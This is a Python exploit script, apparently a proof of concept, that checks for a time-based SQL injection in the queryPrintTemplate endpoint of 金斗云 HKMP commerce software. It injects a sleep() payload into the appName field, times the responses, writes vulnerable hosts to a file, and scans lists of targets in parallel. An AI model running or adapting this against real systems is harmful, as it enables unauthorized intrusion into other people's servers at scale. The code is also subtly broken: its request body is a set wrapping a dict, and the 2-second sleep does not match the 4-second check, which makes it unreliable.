import requests,argparse,time,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool

def banner():
    test = """金斗云HKMP智慧商业软件queryPrintTemplate存在SQL注入漏洞"""
    print(test)


def poc(target):
    payload= "/admin/configApp/queryPrintTemplate"
    data = {
        {"appId": "hkmp", "data": {"adminUserCode": "test1234", "adminUserName": "test1234",
                                   "appName": "悟空POS Win版' AND (SELECt 5 from (select(sleep(2)))x) and 'zz'='zz",
                                   "configGroup": "1", "mchId": "0001"}, "deviceId": "hkmp", "mchId": "hkmp",
         "nonce": 3621722933, "sign": "hkmp", "timestamp": 1719306504}
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Content-Type": "application/json",
    }
    proxies = {
        "http":"http://127.0.0.1:8080",
        "https":"http://127.0.0.1:8080"
    }
    try:
        res1 = requests.post(url=target+payload,data=data,verify=False,headers=headers,timeout=15,proxies=proxies)
        res2 = requests.post(url=target,data=data,verify=False,headers=headers,timeout=15)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1 - time2 >= 4 and time1 >4:
            print(f"[+]{target}存在延时注入漏洞")
            with open ("result.txt", "a", encoding="utf-8") as f:
                f.write(f"[+]{target}存在延时注入漏洞\n")

        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)

def main():
    banner()
    parser =argparse.ArgumentParser(description="金斗云HKMP智慧商业软件queryPrintTemplate存在SQL注入漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")

if __name__=='__main__':
    main()